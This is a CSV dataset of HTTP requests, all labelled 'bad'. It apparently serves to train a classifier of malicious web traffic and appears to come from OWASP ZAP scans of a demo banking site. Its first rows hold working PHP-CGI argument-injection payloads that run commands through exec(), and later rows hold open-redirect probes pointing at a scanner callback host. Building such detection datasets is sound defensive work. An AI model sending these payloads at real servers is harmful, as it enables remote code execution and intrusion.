method,path,body,single_q,double_q,dashes,braces,spaces,badwords_count,class
POST,b'/my%20documents/JohnSmith/Bank%20Site%20Documents/subscribe.jsp?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input',"b'<?php exec(\'echo it6f7t1r2rx7ymxrs5fx\',$colm);echo join(""\n"",$colm);die();?>'",2,2,0,3,9,0,bad
POST,b'/pr?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input',"b'<?php exec(\'cmd.exe /C echo it6f7t1r2rx7ymxrs5fx\',$colm);echo join(""\n"",$colm);die();?>'",2,2,0,3,8,0,bad
POST,b'/sameDomain?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input',"b'<?php exec(\'cmd.exe /C echo it6f7t1r2rx7ymxrs5fx\',$colm);echo join(""\n"",$colm);die();?>'",2,2,0,3,8,0,bad
POST,b'/robots.txt?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input',"b'<?php exec(\'cmd.exe /C echo it6f7t1r2rx7ymxrs5fx\',$colm);echo join(""\n"",$colm);die();?>'",2,2,0,3,8,0,bad
POST,b'/pr/communityannualreport.pdf?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input',"b'<?php exec(\'cmd.exe /C echo it6f7t1r2rx7ymxrs5fx\',$colm);echo join(""\n"",$colm);die();?>'",2,2,0,3,8,0,bad
POST,b'/search.jsp?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input',"b'<?php exec(\'cmd.exe /C echo it6f7t1r2rx7ymxrs5fx\',$colm);echo join(""\n"",$colm);die();?>'",2,2,0,3,8,0,bad
POST,b'/retirement.htm?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input',"b'<?php exec(\'cmd.exe /C echo it6f7t1r2rx7ymxrs5fx\',$colm);echo join(""\n"",$colm);die();?>'",2,2,0,3,8,0,bad
POST,b'/security.htm?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input',"b'<?php exec(\'cmd.exe /C echo it6f7t1r2rx7ymxrs5fx\',$colm);echo join(""\n"",$colm);die();?>'",2,2,0,3,8,0,bad
POST,b'/sitemap.xml?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input',"b'<?php exec(\'cmd.exe /C echo it6f7t1r2rx7ymxrs5fx\',$colm);echo join(""\n"",$colm);die();?>'",2,2,0,3,8,0,bad
POST,b'/search.jsp?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input',"b'<?php exec(\'echo it6f7t1r2rx7ymxrs5fx\',$colm);echo join(""\n"",$colm);die();?>'",2,2,0,3,6,0,bad
POST,b'/pr?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input',"b'<?php exec(\'echo it6f7t1r2rx7ymxrs5fx\',$colm);echo join(""\n"",$colm);die();?>'",2,2,0,3,6,0,bad
POST,b'/robots.txt?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input',"b'<?php exec(\'echo it6f7t1r2rx7ymxrs5fx\',$colm);echo join(""\n"",$colm);die();?>'",2,2,0,3,6,0,bad
POST,b'/status_check.jsp?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input',"b'<?php exec(\'cmd.exe /C echo it6f7t1r2rx7ymxrs5fx\',$colm);echo join(""\n"",$colm);die();?>'",2,2,0,3,8,0,bad
POST,b'/static/cgi.exe?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input',"b'<?php exec(\'cmd.exe /C echo it6f7t1r2rx7ymxrs5fx\',$colm);echo join(""\n"",$colm);die();?>'",2,2,0,3,8,0,bad
POST,b'/static/index.jsp?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input',"b'<?php exec(\'cmd.exe /C echo it6f7t1r2rx7ymxrs5fx\',$colm);echo join(""\n"",$colm);die();?>'",2,2,0,3,8,0,bad
POST,b'/static?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input',"b'<?php exec(\'cmd.exe /C echo it6f7t1r2rx7ymxrs5fx\',$colm);echo join(""\n"",$colm);die();?>'",2,2,0,3,8,0,bad
POST,b'/static/personal_savings.htm?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input',"b'<?php exec(\'cmd.exe /C echo it6f7t1r2rx7ymxrs5fx\',$colm);echo join(""\n"",$colm);die();?>'",2,2,0,3,8,0,bad
POST,b'/static/subscribe.jsp?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input',"b'<?php exec(\'cmd.exe /C echo it6f7t1r2rx7ymxrs5fx\',$colm);echo join(""\n"",$colm);die();?>'",2,2,0,3,8,0,bad
POST,b'/retirement.htm?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input',"b'<?php exec(\'echo it6f7t1r2rx7ymxrs5fx\',$colm);echo join(""\n"",$colm);die();?>'",2,2,0,3,6,0,bad
POST,b'/sameDomain?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input',"b'<?php exec(\'echo it6f7t1r2rx7ymxrs5fx\',$colm);echo join(""\n"",$colm);die();?>'",2,2,0,3,6,0,bad
POST,b'/sitemap.xml?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input',"b'<?php exec(\'echo it6f7t1r2rx7ymxrs5fx\',$colm);echo join(""\n"",$colm);die();?>'",2,2,0,3,6,0,bad
POST,b'/security.htm?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input',"b'<?php exec(\'echo it6f7t1r2rx7ymxrs5fx\',$colm);echo join(""\n"",$colm);die();?>'",2,2,0,3,6,0,bad
POST,b'/static/personal_savings.htm?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input',"b'<?php exec(\'echo it6f7t1r2rx7ymxrs5fx\',$colm);echo join(""\n"",$colm);die();?>'",2,2,0,3,6,0,bad
POST,b'/static/cgi.exe?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input',"b'<?php exec(\'echo it6f7t1r2rx7ymxrs5fx\',$colm);echo join(""\n"",$colm);die();?>'",2,2,0,3,6,0,bad
POST,b'/pr/communityannualreport.pdf?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input',"b'<?php exec(\'echo it6f7t1r2rx7ymxrs5fx\',$colm);echo join(""\n"",$colm);die();?>'",2,2,0,3,6,0,bad
POST,b'/static/subscribe.jsp?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input',"b'<?php exec(\'echo it6f7t1r2rx7ymxrs5fx\',$colm);echo join(""\n"",$colm);die();?>'",2,2,0,3,6,0,bad
POST,b'/static?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input',"b'<?php exec(\'echo it6f7t1r2rx7ymxrs5fx\',$colm);echo join(""\n"",$colm);die();?>'",2,2,0,3,6,0,bad
POST,b'/status_check.jsp?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input',"b'<?php exec(\'echo it6f7t1r2rx7ymxrs5fx\',$colm);echo join(""\n"",$colm);die();?>'",2,2,0,3,6,0,bad
POST,b'/static/index.jsp?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input',"b'<?php exec(\'echo it6f7t1r2rx7ymxrs5fx\',$colm);echo join(""\n"",$colm);die();?>'",2,2,0,3,6,0,bad
POST,b'/subscribe.jsp?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input',"b'<?php exec(\'cmd.exe /C echo it6f7t1r2rx7ymxrs5fx\',$colm);echo join(""\n"",$colm);die();?>'",2,2,0,3,8,0,bad
POST,b'/subscribe.swf?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input',"b'<?php exec(\'cmd.exe /C echo it6f7t1r2rx7ymxrs5fx\',$colm);echo join(""\n"",$colm);die();?>'",2,2,0,3,8,0,bad
POST,b'/survey_questions.jsp?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input',"b'<?php exec(\'cmd.exe /C echo it6f7t1r2rx7ymxrs5fx\',$colm);echo join(""\n"",$colm);die();?>'",2,2,0,3,8,0,bad
POST,b'/survey_questions.jsp?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input',"b'<?php exec(\'echo it6f7t1r2rx7ymxrs5fx\',$colm);echo join(""\n"",$colm);die();?>'",2,2,0,3,6,0,bad
POST,b'/subscribe.jsp?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input',"b'<?php exec(\'echo it6f7t1r2rx7ymxrs5fx\',$colm);echo join(""\n"",$colm);die();?>'",2,2,0,3,6,0,bad
POST,b'/swagger?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input',"b'<?php exec(\'cmd.exe /C echo it6f7t1r2rx7ymxrs5fx\',$colm);echo join(""\n"",$colm);die();?>'",2,2,0,3,8,0,bad
POST,b'/swagger/index.html?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input',"b'<?php exec(\'cmd.exe /C echo it6f7t1r2rx7ymxrs5fx\',$colm);echo join(""\n"",$colm);die();?>'",2,2,0,3,8,0,bad
POST,b'/swagger/swagger-ui-bundle.js?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input',"b'<?php exec(\'cmd.exe /C echo it6f7t1r2rx7ymxrs5fx\',$colm);echo join(""\n"",$colm);die();?>'",2,2,0,3,8,0,bad
POST,b'/subscribe.swf?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input',"b'<?php exec(\'echo it6f7t1r2rx7ymxrs5fx\',$colm);echo join(""\n"",$colm);die();?>'",2,2,0,3,6,0,bad
POST,b'/swagger/swagger-ui-standalone-preset.js?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input',"b'<?php exec(\'cmd.exe /C echo it6f7t1r2rx7ymxrs5fx\',$colm);echo join(""\n"",$colm);die();?>'",2,2,0,3,8,0,bad
POST,b'/swagger?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input',"b'<?php exec(\'echo it6f7t1r2rx7ymxrs5fx\',$colm);echo join(""\n"",$colm);die();?>'",2,2,0,3,6,0,bad
POST,b'/swagger/index.html?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input',"b'<?php exec(\'echo it6f7t1r2rx7ymxrs5fx\',$colm);echo join(""\n"",$colm);die();?>'",2,2,0,3,6,0,bad
POST,b'/swagger/swagger-ui-standalone-preset.js?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input',"b'<?php exec(\'echo it6f7t1r2rx7ymxrs5fx\',$colm);echo join(""\n"",$colm);die();?>'",2,2,0,3,6,0,bad
POST,b'/swagger/swagger-ui-bundle.js?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input',"b'<?php exec(\'echo it6f7t1r2rx7ymxrs5fx\',$colm);echo join(""\n"",$colm);die();?>'",2,2,0,3,6,0,bad
POST,b'/Documents/JohnSmith/cgi.exe?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input',"b'<?php exec(\'echo it6f7t1r2rx7ymxrs5fx\',$colm);echo join(""\n"",$colm);die();?>'",2,2,0,3,6,0,bad
POST,b'/doLogin',b'uid=6542095270498749340.owasp.org&passw=ZAP&btnSubmit=Login',0,0,0,0,0,1,bad
POST,b'/doSubscribe',b'txtEmail=6542095270498749340.owasp.org&btnSubmit=Subscribe',0,0,0,0,0,0,bad
POST,b'/sendFeedback',b'cfile=6542095270498749340.owasp.org&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+',0,0,0,0,7,0,bad
POST,b'/sendFeedback',b'cfile=http%3A%2F%2F6542095270498749340.owasp.org&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+',0,0,0,0,7,0,bad
POST,b'/doSubscribe',b'txtEmail=http%3A%2F%2F6542095270498749340.owasp.org&btnSubmit=Subscribe',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=http%3A%2F%2F6542095270498749340.owasp.org&passw=ZAP&btnSubmit=Login',0,0,0,0,0,1,bad
POST,b'/sendFeedback',b'cfile=https%3A%2F%2F6542095270498749340.owasp.org&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+',0,0,0,0,7,0,bad
POST,b'/doSubscribe',b'txtEmail=https%3A%2F%2F6542095270498749340.owasp.org&btnSubmit=Subscribe',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=https%3A%2F%2F6542095270498749340.owasp.org&passw=ZAP&btnSubmit=Login',0,0,0,0,0,1,bad
GET,b'/Documents/JohnSmith/index.jsp?content=6542095270498749340.owasp.org',b'',0,0,0,0,0,0,bad
GET,b'/Privacypolicy.jsp?sec=6542095270498749340.owasp.org&template=US',b'',0,0,0,0,0,0,bad
POST,b'/doSubscribe',b'txtEmail=https%3A%2F%2F6542095270498749340%252eowasp%252eorg&btnSubmit=Subscribe',0,0,0,0,0,0,bad
POST,b'/sendFeedback',b'cfile=https%3A%2F%2F6542095270498749340%252eowasp%252eorg&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+',0,0,0,0,7,0,bad
POST,b'/doLogin',b'uid=https%3A%2F%2F6542095270498749340%252eowasp%252eorg&passw=ZAP&btnSubmit=Login',0,0,0,0,0,1,bad
GET,b'/Documents/JohnSmith/index.jsp?content=http%3A%2F%2F6542095270498749340.owasp.org',b'',0,0,0,0,0,0,bad
GET,b'/Privacypolicy.jsp?sec=http%3A%2F%2F6542095270498749340.owasp.org&template=US',b'',0,0,0,0,0,0,bad
GET,b'/disclaimer.htm?url=6542095270498749340.owasp.org',b'',0,0,0,0,0,0,bad
GET,b'/default.jsp?content=6542095270498749340.owasp.org',b'',0,0,0,0,0,0,bad
POST,b'/doSubscribe',b'txtEmail=5%3BURL%3D%27https%3A%2F%2F6542095270498749340.owasp.org%27&btnSubmit=Subscribe',2,0,0,0,0,0,bad
POST,b'/sendFeedback',b'cfile=5%3BURL%3D%27https%3A%2F%2F6542095270498749340.owasp.org%27&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+',2,0,0,0,7,0,bad
POST,b'/doLogin',b'uid=5%3BURL%3D%27https%3A%2F%2F6542095270498749340.owasp.org%27&passw=ZAP&btnSubmit=Login',2,0,0,0,0,1,bad
GET,b'/Documents/JohnSmith/index.jsp?content=https%3A%2F%2F6542095270498749340.owasp.org',b'',0,0,0,0,0,0,bad
GET,b'/default.jsp?content=http%3A%2F%2F6542095270498749340.owasp.org',b'',0,0,0,0,0,0,bad
GET,b'/disclaimer.htm?url=http%3A%2F%2F6542095270498749340.owasp.org',b'',0,0,0,0,0,0,bad
GET,b'/images/index.jsp?content=6542095270498749340.owasp.org',b'',0,0,0,0,0,0,bad
GET,b'/index.jsp?content=6542095270498749340.owasp.org',b'',0,0,0,0,0,0,bad
GET,b'/Privacypolicy.jsp?sec=https%3A%2F%2F6542095270498749340.owasp.org&template=US',b'',0,0,0,0,0,0,bad
GET,b'/index.jsp?content=6542095270498749340.owasp.org&job=MortgageLendingAccountExecutive%3ASales',b'',0,0,0,0,0,0,bad
POST,b'/doSubscribe',b'txtEmail=URL%3D%27http%3A%2F%2F6542095270498749340.owasp.org%27&btnSubmit=Subscribe',2,0,0,0,0,0,bad
POST,b'/sendFeedback',b'cfile=URL%3D%27http%3A%2F%2F6542095270498749340.owasp.org%27&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+',2,0,0,0,7,0,bad
POST,b'/doLogin',b'uid=URL%3D%27http%3A%2F%2F6542095270498749340.owasp.org%27&passw=ZAP&btnSubmit=Login',2,0,0,0,0,1,bad
GET,b'/default.jsp?content=https%3A%2F%2F6542095270498749340.owasp.org',b'',0,0,0,0,0,0,bad
GET,b'/Documents/JohnSmith/index.jsp?content=https%3A%2F%2F6542095270498749340%252eowasp%252eorg',b'',0,0,0,0,0,0,bad
GET,b'/disclaimer.htm?url=https%3A%2F%2F6542095270498749340.owasp.org',b'',0,0,0,0,0,0,bad
GET,b'/Privacypolicy.jsp?sec=https%3A%2F%2F6542095270498749340%252eowasp%252eorg&template=US',b'',0,0,0,0,0,0,bad
GET,b'/index.jsp?content=http%3A%2F%2F6542095270498749340.owasp.org&job=MortgageLendingAccountExecutive%3ASales',b'',0,0,0,0,0,0,bad
GET,b'/images/index.jsp?content=http%3A%2F%2F6542095270498749340.owasp.org',b'',0,0,0,0,0,0,bad
GET,b'/index.jsp?content=http%3A%2F%2F6542095270498749340.owasp.org',b'',0,0,0,0,0,0,bad
POST,b'/doSubscribe',b'txtEmail=http%3A%2F%2F%5C6542095270498749340.owasp.org&btnSubmit=Subscribe',0,0,0,0,0,0,bad
POST,b'/sendFeedback',b'cfile=http%3A%2F%2F%5C6542095270498749340.owasp.org&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+',0,0,0,0,7,0,bad
GET,b'/default.jsp?content=https%3A%2F%2F6542095270498749340%252eowasp%252eorg',b'',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=http%3A%2F%2F%5C6542095270498749340.owasp.org&passw=ZAP&btnSubmit=Login',0,0,0,0,0,1,bad
GET,b'/Documents/JohnSmith/index.jsp?content=5%3BURL%3D%27https%3A%2F%2F6542095270498749340.owasp.org%27',b'',2,0,0,0,0,0,bad
GET,b'/Privacypolicy.jsp?sec=5%3BURL%3D%27https%3A%2F%2F6542095270498749340.owasp.org%27&template=US',b'',2,0,0,0,0,0,bad
GET,b'/disclaimer.htm?url=https%3A%2F%2F6542095270498749340%252eowasp%252eorg',b'',0,0,0,0,0,0,bad
GET,b'/index.jsp?content=https%3A%2F%2F6542095270498749340.owasp.org&job=MortgageLendingAccountExecutive%3ASales',b'',0,0,0,0,0,0,bad
GET,b'/images/index.jsp?content=https%3A%2F%2F6542095270498749340.owasp.org',b'',0,0,0,0,0,0,bad
GET,b'/index.jsp?content=https%3A%2F%2F6542095270498749340.owasp.org',b'',0,0,0,0,0,0,bad
POST,b'/doSubscribe',b'txtEmail=https%3A%2F%2F%5C6542095270498749340.owasp.org&btnSubmit=Subscribe',0,0,0,0,0,0,bad
POST,b'/sendFeedback',b'cfile=https%3A%2F%2F%5C6542095270498749340.owasp.org&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+',0,0,0,0,7,0,bad
GET,b'/default.jsp?content=5%3BURL%3D%27https%3A%2F%2F6542095270498749340.owasp.org%27',b'',2,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=https%3A%2F%2F%5C6542095270498749340.owasp.org&passw=ZAP&btnSubmit=Login',0,0,0,0,0,1,bad
GET,b'/Documents/JohnSmith/index.jsp?content=URL%3D%27http%3A%2F%2F6542095270498749340.owasp.org%27',b'',2,0,0,0,0,0,bad
GET,b'/Privacypolicy.jsp?sec=URL%3D%27http%3A%2F%2F6542095270498749340.owasp.org%27&template=US',b'',2,0,0,0,0,0,bad
GET,b'/disclaimer.htm?url=5%3BURL%3D%27https%3A%2F%2F6542095270498749340.owasp.org%27',b'',2,0,0,0,0,0,bad
GET,b'/index.jsp?content=https%3A%2F%2F6542095270498749340%252eowasp%252eorg&job=MortgageLendingAccountExecutive%3ASales',b'',0,0,0,0,0,0,bad
GET,b'/images/index.jsp?content=https%3A%2F%2F6542095270498749340%252eowasp%252eorg',b'',0,0,0,0,0,0,bad
POST,b'/sendFeedback',b'cfile=%2F%2F6542095270498749340.owasp.org&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+',0,0,0,0,7,0,bad
POST,b'/doSubscribe',b'txtEmail=%2F%2F6542095270498749340.owasp.org&btnSubmit=Subscribe',0,0,0,0,0,0,bad
GET,b'/index.jsp?content=https%3A%2F%2F6542095270498749340%252eowasp%252eorg',b'',0,0,0,0,0,0,bad
GET,b'/default.jsp?content=URL%3D%27http%3A%2F%2F6542095270498749340.owasp.org%27',b'',2,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=%2F%2F6542095270498749340.owasp.org&passw=ZAP&btnSubmit=Login',0,0,0,0,0,1,bad
GET,b'/Documents/JohnSmith/index.jsp?content=http%3A%2F%2F%5C6542095270498749340.owasp.org',b'',0,0,0,0,0,0,bad
GET,b'/Privacypolicy.jsp?sec=http%3A%2F%2F%5C6542095270498749340.owasp.org&template=US',b'',0,0,0,0,0,0,bad
GET,b'/disclaimer.htm?url=URL%3D%27http%3A%2F%2F6542095270498749340.owasp.org%27',b'',2,0,0,0,0,0,bad
GET,b'/images/index.jsp?content=5%3BURL%3D%27https%3A%2F%2F6542095270498749340.owasp.org%27',b'',2,0,0,0,0,0,bad
GET,b'/index.jsp?content=5%3BURL%3D%27https%3A%2F%2F6542095270498749340.owasp.org%27&job=MortgageLendingAccountExecutive%3ASales',b'',2,0,0,0,0,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=6542095270498749340.owasp.org&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+',0,0,0,0,7,0,bad
POST,b'/doSubscribe',b'txtEmail=ZAP&btnSubmit=6542095270498749340.owasp.org',0,0,0,0,0,0,bad
GET,b'/index.jsp?content=5%3BURL%3D%27https%3A%2F%2F6542095270498749340.owasp.org%27',b'',2,0,0,0,0,0,bad
GET,b'/default.jsp?content=http%3A%2F%2F%5C6542095270498749340.owasp.org',b'',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=ZAP&passw=6542095270498749340.owasp.org&btnSubmit=Login',0,0,0,0,0,1,bad
GET,b'/Documents/JohnSmith/index.jsp?content=https%3A%2F%2F%5C6542095270498749340.owasp.org',b'',0,0,0,0,0,0,bad
GET,b'/Privacypolicy.jsp?sec=https%3A%2F%2F%5C6542095270498749340.owasp.org&template=US',b'',0,0,0,0,0,0,bad
GET,b'/disclaimer.htm?url=http%3A%2F%2F%5C6542095270498749340.owasp.org',b'',0,0,0,0,0,0,bad
GET,b'/images/index.jsp?content=URL%3D%27http%3A%2F%2F6542095270498749340.owasp.org%27',b'',2,0,0,0,0,0,bad
GET,b'/index.jsp?content=URL%3D%27http%3A%2F%2F6542095270498749340.owasp.org%27&job=MortgageLendingAccountExecutive%3ASales',b'',2,0,0,0,0,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=http%3A%2F%2F6542095270498749340.owasp.org&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+',0,0,0,0,7,0,bad
POST,b'/doSubscribe',b'txtEmail=ZAP&btnSubmit=http%3A%2F%2F6542095270498749340.owasp.org',0,0,0,0,0,0,bad
GET,b'/index.jsp?content=URL%3D%27http%3A%2F%2F6542095270498749340.owasp.org%27',b'',2,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=ZAP&passw=http%3A%2F%2F6542095270498749340.owasp.org&btnSubmit=Login',0,0,0,0,0,1,bad
GET,b'/default.jsp?content=https%3A%2F%2F%5C6542095270498749340.owasp.org',b'',0,0,0,0,0,0,bad
GET,b'/Documents/JohnSmith/index.jsp?content=%2F%2F6542095270498749340.owasp.org',b'',0,0,0,0,0,0,bad
GET,b'/Privacypolicy.jsp?sec=%2F%2F6542095270498749340.owasp.org&template=US',b'',0,0,0,0,0,0,bad
GET,b'/disclaimer.htm?url=https%3A%2F%2F%5C6542095270498749340.owasp.org',b'',0,0,0,0,0,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=https%3A%2F%2F6542095270498749340.owasp.org&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+',0,0,0,0,7,0,bad
POST,b'/doSubscribe',b'txtEmail=ZAP&btnSubmit=https%3A%2F%2F6542095270498749340.owasp.org',0,0,0,0,0,0,bad
GET,b'/index.jsp?content=http%3A%2F%2F%5C6542095270498749340.owasp.org&job=MortgageLendingAccountExecutive%3ASales',b'',0,0,0,0,0,0,bad
GET,b'/images/index.jsp?content=http%3A%2F%2F%5C6542095270498749340.owasp.org',b'',0,0,0,0,0,0,bad
GET,b'/index.jsp?content=http%3A%2F%2F%5C6542095270498749340.owasp.org',b'',0,0,0,0,0,0,bad
GET,b'/default.jsp?content=%2F%2F6542095270498749340.owasp.org',b'',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=ZAP&passw=https%3A%2F%2F6542095270498749340.owasp.org&btnSubmit=Login',0,0,0,0,0,1,bad
GET,b'/Privacypolicy.jsp?sec=Careers&template=6542095270498749340.owasp.org',b'',0,0,0,0,0,0,bad
POST,b'/doSubscribe',b'txtEmail=ZAP&btnSubmit=https%3A%2F%2F6542095270498749340%252eowasp%252eorg',0,0,0,0,0,0,bad
GET,b'/disclaimer.htm?url=%2F%2F6542095270498749340.owasp.org',b'',0,0,0,0,0,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=https%3A%2F%2F6542095270498749340%252eowasp%252eorg&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+',0,0,0,0,7,0,bad
GET,b'/images/index.jsp?content=https%3A%2F%2F%5C6542095270498749340.owasp.org',b'',0,0,0,0,0,0,bad
GET,b'/index.jsp?content=https%3A%2F%2F%5C6542095270498749340.owasp.org&job=MortgageLendingAccountExecutive%3ASales',b'',0,0,0,0,0,0,bad
GET,b'/index.jsp?content=https%3A%2F%2F%5C6542095270498749340.owasp.org',b'',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=ZAP&passw=https%3A%2F%2F6542095270498749340%252eowasp%252eorg&btnSubmit=Login',0,0,0,0,0,1,bad
GET,b'/Privacypolicy.jsp?sec=Careers&template=http%3A%2F%2F6542095270498749340.owasp.org',b'',0,0,0,0,0,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=5%3BURL%3D%27https%3A%2F%2F6542095270498749340.owasp.org%27&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+',2,0,0,0,7,0,bad
POST,b'/doSubscribe',b'txtEmail=ZAP&btnSubmit=5%3BURL%3D%27https%3A%2F%2F6542095270498749340.owasp.org%27',2,0,0,0,0,0,bad
GET,b'/images/index.jsp?content=%2F%2F6542095270498749340.owasp.org',b'',0,0,0,0,0,0,bad
GET,b'/index.jsp?content=%2F%2F6542095270498749340.owasp.org&job=MortgageLendingAccountExecutive%3ASales',b'',0,0,0,0,0,0,bad
GET,b'/index.jsp?content=%2F%2F6542095270498749340.owasp.org',b'',0,0,0,0,0,0,bad
GET,b'/Privacypolicy.jsp?sec=Careers&template=https%3A%2F%2F6542095270498749340.owasp.org',b'',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=ZAP&passw=5%3BURL%3D%27https%3A%2F%2F6542095270498749340.owasp.org%27&btnSubmit=Login',2,0,0,0,0,1,bad
POST,b'/doSubscribe',b'txtEmail=ZAP&btnSubmit=URL%3D%27http%3A%2F%2F6542095270498749340.owasp.org%27',2,0,0,0,0,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=URL%3D%27http%3A%2F%2F6542095270498749340.owasp.org%27&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+',2,0,0,0,7,0,bad
GET,b'/index.jsp?content=inside_jobs.htm&job=6542095270498749340.owasp.org',b'',0,0,0,0,0,0,bad
POST,b'/doSubscribe',b'txtEmail=ZAP&btnSubmit=http%3A%2F%2F%5C6542095270498749340.owasp.org',0,0,0,0,0,0,bad
